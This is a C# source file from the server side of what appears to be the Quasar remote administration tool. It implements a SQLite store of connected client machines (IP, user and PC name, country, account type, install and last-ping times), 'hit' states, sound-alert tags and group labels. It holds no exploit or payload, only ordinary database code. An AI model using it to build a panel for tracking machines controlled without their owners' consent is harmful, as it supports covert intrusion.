using Microsoft.Data.Sqlite;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Windows.Forms;

namespace Quasar.Server.Utilities
{
    public sealed class ClientDatabase
    {
        private readonly string _dbPath;
        private readonly string _connectionString;
        private readonly object _sync = new object();

        public ClientDatabase()
        {
            _dbPath = Path.Combine(Application.StartupPath, "clients.sqlite");
            _connectionString = $"Data Source={_dbPath};Mode=ReadWriteCreate;";
        }

        public void Initialize()
        {
            EnsureSqliteNativeDllStaged();
            lock (_sync)
            {
                using (var conn = new SqliteConnection(_connectionString))
                {
                    conn.Open();

                    using (var cmd = conn.CreateCommand())
                    {
                        cmd.CommandText = @"
CREATE TABLE IF NOT EXISTS Clients (
    Uuid TEXT PRIMARY KEY NOT NULL,
    IpAddress TEXT,
    Tag TEXT,
    UserPc TEXT,
    Version TEXT,
    Status TEXT,
    UserStatus TEXT,
    AcceptPing INTEGER NOT NULL DEFAULT 0,
    Country TEXT,
    CountryCode TEXT,
    OperatingSystem TEXT,
    AccountType TEXT,
    ImageIndex INTEGER,
    InstallTimeUtc TEXT NOT NULL,
    LastPingTimeUtc TEXT NULL,
    HitState TEXT NOT NULL DEFAULT 'Viewed'
);";
                        cmd.ExecuteNonQuery();

                        using (var tagsCmd = conn.CreateCommand())
                        {
                            tagsCmd.CommandText = @"
CREATE TABLE IF NOT EXISTS Tags (
    Name TEXT PRIMARY KEY NOT NULL,
    Color TEXT,
    Sound TEXT
);";
                            tagsCmd.ExecuteNonQuery();
                        }

                        using (var warsCmd = conn.CreateCommand())
                        {
                            warsCmd.CommandText = @"
CREATE TABLE IF NOT EXISTS Warsals (
    Name TEXT PRIMARY KEY NOT NULL
);";
                            warsCmd.ExecuteNonQuery();
                        }

                        using (var cwCmd = conn.CreateCommand())
                        {
                            cwCmd.CommandText = @"
CREATE TABLE IF NOT EXISTS ClientWarsals (
    Uuid TEXT NOT NULL,
    WarsalName TEXT NOT NULL,
    PRIMARY KEY (Uuid, WarsalName)
);";
                            cwCmd.ExecuteNonQuery();
                        }

                        /* If table already existed from a previous version, ensure AcceptPing column exists. */
                        using (var alterCmd = conn.CreateCommand())
                        {
                            alterCmd.CommandText = @"
SELECT COUNT(*)
FROM pragma_table_info('Clients')
WHERE name = 'AcceptPing';";
                            var scalar = alterCmd.ExecuteScalar();
                            long count = (scalar == null || scalar == DBNull.Value) ? 0 : Convert.ToInt64(scalar);
                            if (count == 0)
                            {
                                using (var addCmd = conn.CreateCommand())
                                {
                                    addCmd.CommandText = @"ALTER TABLE Clients ADD COLUMN AcceptPing INTEGER NOT NULL DEFAULT 0;";
                                    addCmd.ExecuteNonQuery();
                                }
                            }
                        }

                        using (var alterHitCmd = conn.CreateCommand())
                        {
                            alterHitCmd.CommandText = @"
SELECT COUNT(*)
FROM pragma_table_info('Clients')
WHERE name = 'HitState';";
                            var hitScalar = alterHitCmd.ExecuteScalar();
                            long hitCount = (hitScalar == null || hitScalar == DBNull.Value) ? 0 : Convert.ToInt64(hitScalar);
                            if (hitCount == 0)
                            {
                                using (var addHit = conn.CreateCommand())
                                {
                                    addHit.CommandText = @"ALTER TABLE Clients ADD COLUMN HitState TEXT NOT NULL DEFAULT 'Viewed';";
                                    addHit.ExecuteNonQuery();
                                }
                            }
                        }

                        using (var normHitCmd = conn.CreateCommand())
                        {
                            normHitCmd.CommandText = @"UPDATE Clients SET HitState = 'Viewed' WHERE HitState = 'Viewed.';";
                            normHitCmd.ExecuteNonQuery();
                        }
                    }
                }
            }
        }

        private static void EnsureSqliteNativeDllStaged()
        {
            try
            {
                string baseDir = AppDomain.CurrentDomain.BaseDirectory;

                // SQLitePCL expects a platform-specific native DLL under:
                //   runtimes/<rid>/native/e_sqlite3.dll
                // In this repo build output we may instead get it under:
                //   win-x64/e_sqlite3.dll
                // So we stage it at runtime before using SqliteConnection.

                var x64Source = Path.Combine(baseDir, "win-x64", "e_sqlite3.dll");
                var x86Source = Path.Combine(baseDir, "win-x86", "e_sqlite3.dll");

                // Fallback: some fresh deployments may not keep the repo's folder layout.
                // If expected sources don't exist, locate any e_sqlite3.dll under baseDir.
                string anySource = null;
                if (!File.Exists(x64Source) && !File.Exists(x86Source))
                {
                    try
                    {
                        anySource = Directory.EnumerateFiles(baseDir, "e_sqlite3.dll", SearchOption.AllDirectories)
                            .FirstOrDefault();
                    }
                    catch
                    {
                        // Best-effort only.
                    }
                }

                // Always try to stage x64 (viewer is built as x64 in csproj).
                string stageX64Source = File.Exists(x64Source) ? x64Source : anySource;
                if (!string.IsNullOrWhiteSpace(stageX64Source))
                {
                    StageNativeDll(
                        stageX64Source,
                        Path.Combine(baseDir, "runtimes", "win-x64", "native", "e_sqlite3.dll"));
                }

                // Also try x86 if its expected source exists (harmless if unused).
                if (File.Exists(x86Source))
                {
                    StageNativeDll(
                        x86Source,
                        Path.Combine(baseDir, "runtimes", "win-x86", "native", "e_sqlite3.dll"));
                }
            }
            catch
            {
                // Best-effort only; if it fails, SqliteConnection will throw and show a real error.
            }
        }

        private static void StageNativeDll(string sourcePath, string destPath)
        {
            if (!File.Exists(sourcePath)) return;
            if (File.Exists(destPath)) return;

            string destDir = Path.GetDirectoryName(destPath);
            if (string.IsNullOrWhiteSpace(destDir)) return;
            Directory.CreateDirectory(destDir);

            File.Copy(sourcePath, destPath);
        }

        public void SetAllClientsDisconnected()
        {
            lock (_sync)
            {
                using (var conn = new SqliteConnection(_connectionString))
                {
                    conn.Open();
                    using (var cmd = conn.CreateCommand())
                    {
                        cmd.CommandText = @"UPDATE Clients SET Status = @status;";
                        cmd.Parameters.AddWithValue("@status", "Disconnected");
                        cmd.ExecuteNonQuery();
                    }
                }
            }
        }

        public int DeleteClient(string uuid)
        {
            if (string.IsNullOrWhiteSpace(uuid)) return 0;

            lock (_sync)
            {
                using (var conn = new SqliteConnection(_connectionString))
                {
                    conn.Open();
                    using (var cmd = conn.CreateCommand())
                    {
                        cmd.CommandText = @"DELETE FROM ClientWarsals WHERE Uuid = @uuid;";
                        cmd.Parameters.AddWithValue("@uuid", uuid);
                        cmd.ExecuteNonQuery();
                    }
                    using (var cmd = conn.CreateCommand())
                    {
                        cmd.CommandText = @"DELETE FROM Clients WHERE Uuid = @uuid;";
                        cmd.Parameters.AddWithValue("@uuid", uuid);
                        return cmd.ExecuteNonQuery();
                    }
                }
            }
        }

        public List<ClientRow> LoadAllClients()
        {
            lock (_sync)
            {
                using (var conn = new SqliteConnection(_connectionString))
                {
                    conn.Open();

                    using (var cmd = conn.CreateCommand())
                    {
                        cmd.CommandText = @"
SELECT
    Uuid, IpAddress, Tag, UserPc, Version, Status, UserStatus, AcceptPing,
    Country, CountryCode, OperatingSystem, AccountType,
    ImageIndex, InstallTimeUtc, LastPingTimeUtc, HitState
FROM Clients
ORDER BY InstallTimeUtc ASC;";

                        var result = new List<ClientRow>();
                        using (var reader = cmd.ExecuteReader())
                        {
                            while (reader.Read())
                            {
                                var row = new ClientRow
                                {
                                    Uuid = reader.IsDBNull(0) ? "" : reader.GetString(0),
                                    IpAddress = reader.IsDBNull(1) ? "" : reader.GetString(1),
                                    Tag = reader.IsDBNull(2) ? "" : reader.GetString(2),
                                    UserPc = reader.IsDBNull(3) ? "" : reader.GetString(3),
                                    Version = reader.IsDBNull(4) ? "" : reader.GetString(4),
                                    Status = reader.IsDBNull(5) ? "Disconnected" : reader.GetString(5),
                                    UserStatus = reader.IsDBNull(6) ? "" : reader.GetString(6),
                                AcceptPing = !reader.IsDBNull(7) && reader.GetInt32(7) != 0,
                                Country = reader.IsDBNull(8) ? "" : reader.GetString(8),
                                CountryCode = reader.IsDBNull(9) ? "" : reader.GetString(9),
                                OperatingSystem = reader.IsDBNull(10) ? "" : reader.GetString(10),
                                AccountType = reader.IsDBNull(11) ? "" : reader.GetString(11),
                                ImageIndex = reader.IsDBNull(12) ? 0 : reader.GetInt32(12),
                                InstallTimeUtc = ParseNullableUtc(reader.IsDBNull(13) ? null : reader.GetString(13)),
                                LastPingTimeUtc = ParseNullableUtc(reader.IsDBNull(14) ? null : reader.GetString(14)),
                                HitState = NormalizeHitState(reader.IsDBNull(15) ? null : reader.GetString(15))
                                };

                                result.Add(row);
                            }
                        }

                        var warMap = LoadWarsalDisplayByUuid(conn);
                        foreach (var row in result)
                        {
                            if (warMap.TryGetValue(row.Uuid, out var w))
                                row.Warsals = w;
                        }

                        return result;
                    }
                }
            }
        }

        private static Dictionary<string, string> LoadWarsalDisplayByUuid(SqliteConnection conn)
        {
            var d = new Dictionary<string, string>(StringComparer.OrdinalIgnoreCase);
            using (var cmd = conn.CreateCommand())
            {
                cmd.CommandText = @"
SELECT Uuid, GROUP_CONCAT(WarsalName, ', ') AS W
FROM ClientWarsals
GROUP BY Uuid;";
                using (var reader = cmd.ExecuteReader())
                {
                    while (reader.Read())
                    {
                        string uuid = reader.IsDBNull(0) ? "" : reader.GetString(0);
                        string w = reader.IsDBNull(1) ? "" : reader.GetString(1);
                        if (uuid.Length > 0)
                            d[uuid] = w ?? "";
                    }
                }
            }
            return d;
        }

        /// <summary>Stored values: "Pending" or "Viewed" (default).</summary>
        public static string NormalizeHitState(string value)
        {
            if (string.IsNullOrWhiteSpace(value)) return "Viewed";
            string t = value.Trim();
            if (string.Equals(t, "Pending", StringComparison.OrdinalIgnoreCase)) return "Pending";
            /* Legacy "Viewed." → "Viewed"; any other non-Pending value → "Viewed". */
            if (string.Equals(t, "Viewed.", StringComparison.OrdinalIgnoreCase)) return "Viewed";
            return "Viewed";
        }

        public string GetClientHitState(string uuid)
        {
            if (string.IsNullOrWhiteSpace(uuid)) return "Viewed";
            lock (_sync)
            {
                using (var conn = new SqliteConnection(_connectionString))
                {
                    conn.Open();
                    using (var cmd = conn.CreateCommand())
                    {
                        cmd.CommandText = @"SELECT HitState FROM Clients WHERE Uuid = @uuid;";
                        cmd.Parameters.AddWithValue("@uuid", uuid);
                        var scalar = cmd.ExecuteScalar();
                        if (scalar == null || scalar == DBNull.Value) return "Viewed";
                        return NormalizeHitState(Convert.ToString(scalar));
                    }
                }
            }
        }

        public void SetClientHitState(string uuid, string hitState)
        {
            if (string.IsNullOrWhiteSpace(uuid)) return;
            string v = NormalizeHitState(hitState);
            lock (_sync)
            {
                using (var conn = new SqliteConnection(_connectionString))
                {
                    conn.Open();
                    using (var cmd = conn.CreateCommand())
                    {
                        cmd.CommandText = @"UPDATE Clients SET HitState = @v WHERE Uuid = @uuid;";
                        cmd.Parameters.AddWithValue("@v", v);
                        cmd.Parameters.AddWithValue("@uuid", uuid);
                        cmd.ExecuteNonQuery();
                    }
                }
            }
        }

        private static DateTime? ParseNullableUtc(string iso)
        {
            if (string.IsNullOrWhiteSpace(iso)) return null;
            if (DateTime.TryParse(iso, null, System.Globalization.DateTimeStyles.RoundtripKind, out var dt))
            {
                return dt.ToUniversalTime();
            }
            return null;
        }

        public ClientRow UpsertClientBasics(
            string uuid,
            string ipAddress,
            string tag,
            string userPc,
            string version,
            string status,
            string userStatus,
            string country,
            string countryCode,
            string operatingSystem,
            string accountType,
            int imageIndex)
        {
            uuid = uuid ?? string.Empty;
            if (uuid.Length == 0) throw new ArgumentException("uuid is required", nameof(uuid));

            lock (_sync)
            {
                using (var conn = new SqliteConnection(_connectionString))
                {
                    conn.Open();

                    DateTime? existingInstallUtc = GetInstallTimeUtc(conn, uuid);
                    if (existingInstallUtc == null)
                        existingInstallUtc = DateTime.UtcNow;

                    using (var cmd = conn.CreateCommand())
                    {
                        DateTime? existingLastPingUtc = GetLastPingTimeUtc(conn, uuid);
                        cmd.CommandText = @"
INSERT INTO Clients (
    Uuid, IpAddress, Tag, UserPc, Version, Status, UserStatus,
    Country, CountryCode, OperatingSystem, AccountType,
    ImageIndex, InstallTimeUtc, LastPingTimeUtc
)
VALUES (
    @uuid, @ip, @tag, @userPc, @version, @status, @userStatus,
    @country, @countryCode, @os, @accountType,
    @imageIndex, @installTimeUtc, NULL
)
ON CONFLICT(Uuid) DO UPDATE SET
    IpAddress = excluded.IpAddress,
    Tag = excluded.Tag,
    UserPc = excluded.UserPc,
    Version = excluded.Version,
    Status = excluded.Status,
    UserStatus = excluded.UserStatus,
    /* AcceptPing is intentionally not updated here (manual user choice). */
    Country = excluded.Country,
    CountryCode = excluded.CountryCode,
    OperatingSystem = excluded.OperatingSystem,
    AccountType = excluded.AccountType,
    ImageIndex = excluded.ImageIndex;"; // preserve LastPingTimeUtc (updated by ping handler)
                        cmd.Parameters.AddWithValue("@uuid", uuid);
                        cmd.Parameters.AddWithValue("@ip", ipAddress ?? "");
                        cmd.Parameters.AddWithValue("@tag", tag ?? "");
                        cmd.Parameters.AddWithValue("@userPc", userPc ?? "");
                        cmd.Parameters.AddWithValue("@version", version ?? "");
                        cmd.Parameters.AddWithValue("@status", status ?? "Disconnected");
                        cmd.Parameters.AddWithValue("@userStatus", userStatus ?? "");
                        cmd.Parameters.AddWithValue("@country", country ?? "");
                        cmd.Parameters.AddWithValue("@countryCode", countryCode ?? "");
                        cmd.Parameters.AddWithValue("@os", operatingSystem ?? "");
                        cmd.Parameters.AddWithValue("@accountType", accountType ?? "");
                        cmd.Parameters.AddWithValue("@imageIndex", imageIndex);
                        cmd.Parameters.AddWithValue("@installTimeUtc", existingInstallUtc.Value.ToString("o"));

                        cmd.ExecuteNonQuery();

                        return new ClientRow
                        {
                            Uuid = uuid,
                            IpAddress = ipAddress ?? "",
                            Tag = tag ?? "",
                            UserPc = userPc ?? "",
                            Version = version ?? "",
                            Status = status ?? "Disconnected",
                            UserStatus = userStatus ?? "",
                            AcceptPing = false, // caller may re-load; UI reads from DB list.
                            Country = country ?? "",
                            CountryCode = countryCode ?? "",
                            OperatingSystem = operatingSystem ?? "",
                            AccountType = accountType ?? "",
                            ImageIndex = imageIndex,
                            InstallTimeUtc = existingInstallUtc,
                            LastPingTimeUtc = existingLastPingUtc,
                            HitState = "Viewed"
                        };
                    }
                }
            }
        }

        public bool GetClientAcceptPing(string uuid)
        {
            if (string.IsNullOrWhiteSpace(uuid)) return false;
            lock (_sync)
            {
                using (var conn = new SqliteConnection(_connectionString))
                {
                    conn.Open();
                    using (var cmd = conn.CreateCommand())
                    {
                        cmd.CommandText = @"SELECT AcceptPing FROM Clients WHERE Uuid = @uuid;";
                        cmd.Parameters.AddWithValue("@uuid", uuid);
                        var scalar = cmd.ExecuteScalar();
                        if (scalar == null || scalar == DBNull.Value) return false;
                        return Convert.ToInt32(scalar) != 0;
                    }
                }
            }
        }

        public bool ClientExists(string uuid)
        {
            if (string.IsNullOrWhiteSpace(uuid)) return false;
            lock (_sync)
            {
                using (var conn = new SqliteConnection(_connectionString))
                {
                    conn.Open();
                    using (var cmd = conn.CreateCommand())
                    {
                        cmd.CommandText = @"SELECT 1 FROM Clients WHERE Uuid = @uuid LIMIT 1;";
                        cmd.Parameters.AddWithValue("@uuid", uuid);
                        var scalar = cmd.ExecuteScalar();
                        return scalar != null && scalar != DBNull.Value;
                    }
                }
            }
        }

        public void SetClientAcceptPing(string uuid, bool acceptPing)
        {
            if (string.IsNullOrWhiteSpace(uuid)) return;
            lock (_sync)
            {
                using (var conn = new SqliteConnection(_connectionString))
                {
                    conn.Open();
                    using (var cmd = conn.CreateCommand())
                    {
                        cmd.CommandText = @"UPDATE Clients SET AcceptPing = @v WHERE Uuid = @uuid;";
                        cmd.Parameters.AddWithValue("@v", acceptPing ? 1 : 0);
                        cmd.Parameters.AddWithValue("@uuid", uuid);
                        cmd.ExecuteNonQuery();
                    }
                }
            }
        }

        public void UpdateClientLastPingTimeUtc(string uuid, DateTime pingTimeUtc)
        {
            if (string.IsNullOrWhiteSpace(uuid)) return;
            lock (_sync)
            {
                using (var conn = new SqliteConnection(_connectionString))
                {
                    conn.Open();
                    using (var cmd = conn.CreateCommand())
                    {
                        cmd.CommandText = @"UPDATE Clients SET LastPingTimeUtc = @v WHERE Uuid = @uuid;";
                        cmd.Parameters.AddWithValue("@v", pingTimeUtc.ToString("o"));
                        cmd.Parameters.AddWithValue("@uuid", uuid);
                        cmd.ExecuteNonQuery();
                    }
                }
            }
        }

        public List<string> LoadAllWarsalNames()
        {
            lock (_sync)
            {
                using (var conn = new SqliteConnection(_connectionString))
                {
                    conn.Open();
                    using (var cmd = conn.CreateCommand())
                    {
                        cmd.CommandText = @"SELECT Name FROM Warsals ORDER BY Name COLLATE NOCASE ASC;";
                        using (var reader = cmd.ExecuteReader())
                        {
                            var list = new List<string>();
                            while (reader.Read())
                            {
                                if (!reader.IsDBNull(0))
                                {
                                    var n = reader.GetString(0)?.Trim() ?? "";
                                    if (n.Length > 0) list.Add(n);
                                }
                            }
                            return list;
                        }
                    }
                }
            }
        }

        public void UpsertWarsal(string name)
        {
            name = (name ?? "").Trim();
            if (name.Length == 0) return;
            lock (_sync)
            {
                using (var conn = new SqliteConnection(_connectionString))
                {
                    conn.Open();
                    using (var cmd = conn.CreateCommand())
                    {
                        cmd.CommandText = @"INSERT OR IGNORE INTO Warsals (Name) VALUES (@name);";
                        cmd.Parameters.AddWithValue("@name", name);
                        cmd.ExecuteNonQuery();
                    }
                }
            }
        }

        public void DeleteWarsal(string name)
        {
            name = (name ?? "").Trim();
            if (name.Length == 0) return;
            lock (_sync)
            {
                using (var conn = new SqliteConnection(_connectionString))
                {
                    conn.Open();
                    using (var cmd = conn.CreateCommand())
                    {
                        cmd.CommandText = @"DELETE FROM ClientWarsals WHERE WarsalName = @name;";
                        cmd.Parameters.AddWithValue("@name", name);
                        cmd.ExecuteNonQuery();
                    }
                    using (var cmd = conn.CreateCommand())
                    {
                        cmd.CommandText = @"DELETE FROM Warsals WHERE Name = @name;";
                        cmd.Parameters.AddWithValue("@name", name);
                        cmd.ExecuteNonQuery();
                    }
                }
            }
        }

        public void RenameWarsal(string oldName, string newName)
        {
            oldName = (oldName ?? "").Trim();
            newName = (newName ?? "").Trim();
            if (oldName.Length == 0 || newName.Length == 0) return;
            if (string.Equals(oldName, newName, StringComparison.OrdinalIgnoreCase))
            {
                UpsertWarsal(newName);
                return;
            }

            lock (_sync)
            {
                using (var conn = new SqliteConnection(_connectionString))
                {
                    conn.Open();
                    using (var tx = conn.BeginTransaction())
                    {
                        using (var u = conn.CreateCommand())
                        {
                            u.Transaction = tx;
                            u.CommandText = @"UPDATE ClientWarsals SET WarsalName = @new WHERE WarsalName = @old;";
                            u.Parameters.AddWithValue("@new", newName);
                            u.Parameters.AddWithValue("@old", oldName);
                            u.ExecuteNonQuery();
                        }
                        using (var del = conn.CreateCommand())
                        {
                            del.Transaction = tx;
                            del.CommandText = @"DELETE FROM Warsals WHERE Name = @old;";
                            del.Parameters.AddWithValue("@old", oldName);
                            del.ExecuteNonQuery();
                        }
                        using (var ins = conn.CreateCommand())
                        {
                            ins.Transaction = tx;
                            ins.CommandText = @"INSERT OR IGNORE INTO Warsals (Name) VALUES (@name);";
                            ins.Parameters.AddWithValue("@name", newName);
                            ins.ExecuteNonQuery();
                        }
                        tx.Commit();
                    }
                }
            }
        }

        public List<string> GetClientWarsals(string uuid)
        {
            if (string.IsNullOrWhiteSpace(uuid)) return new List<string>();
            lock (_sync)
            {
                using (var conn = new SqliteConnection(_connectionString))
                {
                    conn.Open();
                    using (var cmd = conn.CreateCommand())
                    {
                        cmd.CommandText = @"
SELECT WarsalName FROM ClientWarsals WHERE Uuid = @uuid ORDER BY WarsalName COLLATE NOCASE ASC;";
                        cmd.Parameters.AddWithValue("@uuid", uuid);
                        using (var reader = cmd.ExecuteReader())
                        {
                            var list = new List<string>();
                            while (reader.Read())
                            {
                                if (!reader.IsDBNull(0))
                                {
                                    var n = reader.GetString(0)?.Trim() ?? "";
                                    if (n.Length > 0) list.Add(n);
                                }
                            }
                            return list;
                        }
                    }
                }
            }
        }

        public string GetClientWarsalDisplayString(string uuid)
        {
            var list = GetClientWarsals(uuid);
            return list.Count == 0 ? "" : string.Join(", ", list);
        }

        public void SetClientWarsals(string uuid, IReadOnlyList<string> warsalNames)
        {
            if (string.IsNullOrWhiteSpace(uuid)) return;
            uuid = uuid.Trim();
            var names = (warsalNames ?? Array.Empty<string>())
                .Select(n => (n ?? "").Trim())
                .Where(n => n.Length > 0)
                .Distinct(StringComparer.OrdinalIgnoreCase)
                .ToList();

            lock (_sync)
            {
                using (var conn = new SqliteConnection(_connectionString))
                {
                    conn.Open();
                    using (var tx = conn.BeginTransaction())
                    {
                        using (var del = conn.CreateCommand())
                        {
                            del.Transaction = tx;
                            del.CommandText = @"DELETE FROM ClientWarsals WHERE Uuid = @uuid;";
                            del.Parameters.AddWithValue("@uuid", uuid);
                            del.ExecuteNonQuery();
                        }
                        foreach (var n in names)
                        {
                            using (var insW = conn.CreateCommand())
                            {
                                insW.Transaction = tx;
                                insW.CommandText = @"INSERT OR IGNORE INTO Warsals (Name) VALUES (@name);";
                                insW.Parameters.AddWithValue("@name", n);
                                insW.ExecuteNonQuery();
                            }
                            using (var ins = conn.CreateCommand())
                            {
                                ins.Transaction = tx;
                                ins.CommandText = @"INSERT OR IGNORE INTO ClientWarsals (Uuid, WarsalName) VALUES (@uuid, @w);";
                                ins.Parameters.AddWithValue("@uuid", uuid);
                                ins.Parameters.AddWithValue("@w", n);
                                ins.ExecuteNonQuery();
                            }
                        }
                        tx.Commit();
                    }
                }
            }
        }

        public string GetClientTag(string uuid)
        {
            if (string.IsNullOrWhiteSpace(uuid)) return "";
            lock (_sync)
            {
                using (var conn = new SqliteConnection(_connectionString))
                {
                    conn.Open();
                    using (var cmd = conn.CreateCommand())
                    {
                        cmd.CommandText = @"SELECT Tag FROM Clients WHERE Uuid = @uuid;";
                        cmd.Parameters.AddWithValue("@uuid", uuid);
                        var scalar = cmd.ExecuteScalar();
                        return (scalar == null || scalar == DBNull.Value) ? "" : Convert.ToString(scalar) ?? "";
                    }
                }
            }
        }

        public void SetClientTag(string uuid, string tag)
        {
            if (string.IsNullOrWhiteSpace(uuid)) return;
            lock (_sync)
            {
                using (var conn = new SqliteConnection(_connectionString))
                {
                    conn.Open();
                    using (var cmd = conn.CreateCommand())
                    {
                        cmd.CommandText = @"UPDATE Clients SET Tag = @tag WHERE Uuid = @uuid;";
                        cmd.Parameters.AddWithValue("@tag", tag ?? "");
                        cmd.Parameters.AddWithValue("@uuid", uuid);
                        cmd.ExecuteNonQuery();
                    }
                }
            }
        }

        public List<TagRow> LoadAllTags()
        {
            lock (_sync)
            {
                using (var conn = new SqliteConnection(_connectionString))
                {
                    conn.Open();
                    using (var cmd = conn.CreateCommand())
                    {
                        cmd.CommandText = @"SELECT Name, Color, Sound FROM Tags ORDER BY Name COLLATE NOCASE ASC;";
                        using (var reader = cmd.ExecuteReader())
                        {
                            var rows = new List<TagRow>();
                            while (reader.Read())
                            {
                                rows.Add(new TagRow
                                {
                                    Name = reader.IsDBNull(0) ? "" : reader.GetString(0),
                                    Color = reader.IsDBNull(1) ? "" : reader.GetString(1),
                                    Sound = reader.IsDBNull(2) ? "" : reader.GetString(2)
                                });
                            }
                            return rows;
                        }
                    }
                }
            }
        }

        public void UpsertTag(string name, string color, string sound)
        {
            name = (name ?? "").Trim();
            if (name.Length == 0) return;
            lock (_sync)
            {
                using (var conn = new SqliteConnection(_connectionString))
                {
                    conn.Open();
                    using (var cmd = conn.CreateCommand())
                    {
                        cmd.CommandText = @"
INSERT INTO Tags (Name, Color, Sound)
VALUES (@name, @color, @sound)
ON CONFLICT(Name) DO UPDATE SET
    Color = excluded.Color,
    Sound = excluded.Sound;";
                        cmd.Parameters.AddWithValue("@name", name);
                        cmd.Parameters.AddWithValue("@color", color ?? "");
                        cmd.Parameters.AddWithValue("@sound", sound ?? "");
                        cmd.ExecuteNonQuery();
                    }
                }
            }
        }

        public void DeleteTag(string name)
        {
            name = (name ?? "").Trim();
            if (name.Length == 0) return;
            lock (_sync)
            {
                using (var conn = new SqliteConnection(_connectionString))
                {
                    conn.Open();
                    using (var cmd = conn.CreateCommand())
                    {
                        cmd.CommandText = @"DELETE FROM Tags WHERE Name = @name;";
                        cmd.Parameters.AddWithValue("@name", name);
                        cmd.ExecuteNonQuery();
                    }
                }
            }
        }

        public TagRow GetTag(string name)
        {
            name = (name ?? "").Trim();
            if (name.Length == 0) return null;
            lock (_sync)
            {
                using (var conn = new SqliteConnection(_connectionString))
                {
                    conn.Open();
                    using (var cmd = conn.CreateCommand())
                    {
                        cmd.CommandText = @"SELECT Name, Color, Sound FROM Tags WHERE Name = @name;";
                        cmd.Parameters.AddWithValue("@name", name);
                        using (var reader = cmd.ExecuteReader())
                        {
                            if (!reader.Read()) return null;
                            return new TagRow
                            {
                                Name = reader.IsDBNull(0) ? "" : reader.GetString(0),
                                Color = reader.IsDBNull(1) ? "" : reader.GetString(1),
                                Sound = reader.IsDBNull(2) ? "" : reader.GetString(2)
                            };
                        }
                    }
                }
            }
        }

        private static DateTime? GetInstallTimeUtc(SqliteConnection conn, string uuid)
        {
            using (var cmd = conn.CreateCommand())
            {
                cmd.CommandText = @"SELECT InstallTimeUtc FROM Clients WHERE Uuid = @uuid;";
                cmd.Parameters.AddWithValue("@uuid", uuid);

                var scalar = cmd.ExecuteScalar();
                if (scalar == null || scalar == DBNull.Value) return null;

                var iso = Convert.ToString(scalar);
                if (string.IsNullOrWhiteSpace(iso)) return null;

                DateTime dt;
                if (DateTime.TryParse(iso, null, System.Globalization.DateTimeStyles.RoundtripKind, out dt))
                    return dt.ToUniversalTime();

                return null;
            }
        }

        private static DateTime? GetLastPingTimeUtc(SqliteConnection conn, string uuid)
        {
            using (var cmd = conn.CreateCommand())
            {
                cmd.CommandText = @"SELECT LastPingTimeUtc FROM Clients WHERE Uuid = @uuid;";
                cmd.Parameters.AddWithValue("@uuid", uuid);

                var scalar = cmd.ExecuteScalar();
                if (scalar == null || scalar == DBNull.Value) return null;

                var iso = Convert.ToString(scalar);
                if (string.IsNullOrWhiteSpace(iso)) return null;

                DateTime dt;
                if (DateTime.TryParse(iso, null, System.Globalization.DateTimeStyles.RoundtripKind, out dt))
                    return dt.ToUniversalTime();

                return null;
            }
        }
    }

    public sealed class ClientRow
    {
        public string Uuid { get; set; } = "";
        public string IpAddress { get; set; } = "";
        public string Tag { get; set; } = "";
        /// <summary>Comma-separated warsal labels for list display (from ClientWarsals).</summary>
        public string Warsals { get; set; } = "";
        public string UserPc { get; set; } = "";
        public string Version { get; set; } = "";
        public string Status { get; set; } = "Disconnected";
        public string UserStatus { get; set; } = "";
        public bool AcceptPing { get; set; } = false;
        public string Country { get; set; } = "";
        public string CountryCode { get; set; } = "";
        public string OperatingSystem { get; set; } = "";
        public string AccountType { get; set; } = "";
        public int ImageIndex { get; set; }
        public DateTime? InstallTimeUtc { get; set; }
        public DateTime? LastPingTimeUtc { get; set; }
        /// <summary>"Pending" or "Viewed"</summary>
        public string HitState { get; set; } = "Viewed";
    }

    public sealed class TagRow
    {
        public string Name { get; set; } = "";
        public string Color { get; set; } = "";
        public string Sound { get; set; } = "";
    }
}

